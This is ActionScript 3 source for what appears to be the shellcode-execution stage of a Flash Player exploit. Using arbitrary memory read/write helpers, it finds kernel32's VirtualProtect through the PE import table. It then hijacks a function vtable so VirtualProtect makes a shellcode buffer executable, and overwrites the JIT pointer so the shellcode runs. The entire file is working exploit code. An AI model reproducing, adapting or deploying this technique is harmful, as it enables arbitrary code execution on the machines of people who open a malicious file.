package
{
	import flash.utils.ByteArray;

	public dynamic class shellwin32 extends exter32
	{
		static function FindVP():uint
		{
			var loc1:uint;
			var loc2:uint;
			//var loc3:uint;
			var loc4:uint;
			var loc5:uint;
			var loc6:uint;
			
			//find IMAGE_DOS_HEADER
			var loc1:uint = Get(GetAddr(infiniteBy)) & 0xffff0000;
			var loc2:uint = loc1 - 0x800000;
			for(var loc3:uint;loc3 < 0x100;loc3++,loc2 -= 0x10000)
			{
				
				if((Get(loc2) & 0xffff) == 0x5a4d)
				{
					trace("this is MZ");
					break;
				}
			}
			if(loc3 >= 0x100)
			{
				Throw("can't find MZ" + Hex(loc1));
			}
			//find IMAGE_NT_HEADS
			loc1 = loc2 + Get(loc2 + 60);
			if(Get(loc1) != 0x4550)
			{
				Throw("can't find PE");
			}
			
			//find the kernel32.dll
			loc4 = Get(loc1 + 132);
			loc1 = loc2 + Get(loc1 + 128);
			loc3 = 12;
			
			while(loc3 < loc4)
			{    
			  	infiniteBy.position = loc2 + Get(loc1 + loc3);
				var dllname:String = infiniteBy.readUTFBytes(12).toLowerCase();
				trace("dllname:" + dllname);
				if(dllname == "kernel32.dll")
				{
					trace("find kernel32.dll");
					loc5 = Get(loc1 + loc3 - 12);
					loc6 = Get(loc1 + loc3 + 4);
					break;
				}
				loc3 = loc3 + 20;
			};
			
			if(loc5 == 0 || loc6 == 0)
			{
				Throw("can't find kernel32");
			}
			
			//find the virtualprotect
			loc5 = (loc5 + loc2);
			loc3 = 0;
			while(loc3 < 0x1000)
			{
				loc1 = Get(loc5);
				if(loc1 == 0)
				{
					Throw("can't find vutialprotect");
				}
				//need add 2 for string repeated
				infiniteBy.position = loc2 + loc1 + 2;
				var funcname:String = infiniteBy.readUTFBytes(14).toLowerCase();
				trace("funcname:" + funcname);
				if(funcname == "virtualprotect")
				{
					return Get(loc2 + loc6 + loc3 * 4);
				}
				loc3++;
				loc5 = loc5 + 4;
			}
			return 0;
		}
		
		static function PayLoad(...a){}
	
		static function CallVP(vp:uint,shellAddr:uint,shellLen:uint)
		{
			//generate the object content shellcode
			PayLoad();
			//find vtable pointer in Payload()
			var p:uint = GetAddr(PayLoad);
			trace("p is:" + p.toString(16));
			var ptbl:uint = Get(Get(Get(Get(p + 8) + 0x14) + 4) + (verflag ? 0xbc:0xb0));
			trace("ptbl is:" + ptbl.toString(16));
			
			//save old pointers
			var p1:uint = Get(ptbl);
			var p2:uint = Get(p + 0x1c);
			var p3:uint = Get(p + 0x20);
			
			var v:Vector.<uint> = new Vector.<uint>(0x100);
			//copt the vtable 
			for(var i:uint;i < 0x100; i++)
			{
				v[i] = Get(p1 - 0x80 + i * 4);
			}
			
			
			//redirect one pointer to virtualprotect
			v[0x20 + 7] = vp;
			//set first arg for virtualprotect
			Set(p + 0x1c,shellAddr);
			//set second arg for virtualprotect
			Set(p + 0x20,shellLen);
			//set thrid arg(0x40) for virtualprotect
			var args:Array = new Array(0x41);
			//replace vtable pointer to Payload()
			Set(ptbl,GetAddrV0(v) + 0x80);
			//call virtualProtect()
			var res = PayLoad.call.apply(null,args);
			
			//recover old pointers
			Set(ptbl,p1);
			Set(p + 0x1c,p2);
			Set(p + 0x20,p3);
		}
		
		
		
		static function Exec()
		{
			//get pyaload address
			var shellAddr:uint = GetAddrV0(Payload.calc);
			trace("payload object addr is:" + shellAddr.toString(16));
			
			//get virtualprotect address
			var vpAddr:uint = FindVP();
			trace("virtualprotect address is:" + vpAddr.toString(16));
			if(vpAddr == 0)
			{
				Throw("vpAddr == 0");
			}
			//call virtualprotect()
			CallVP(vpAddr,shellAddr,Payload.calc.length * 4);
			//find PayLoad jit pointer
			var payAddr:uint = GetAddr(PayLoad);
			trace("payload object:" + payAddr.toString(16));
			payAddr = Get(Get(payAddr + 0x1c) + 8) + 4;
			trace("payAddr:" + payAddr.toString(16));
			var old:uint = Get(payAddr);
			trace("oldAddr:" + old.toString(16));
			
			//cover jit to shellcodeaddress
			Set(payAddr,shellAddr);
			
			//call shellcode
			var res = PayLoad.call(null);
			
			//recover old pointer
			Set(payAddr,old);
		}
		
	}
}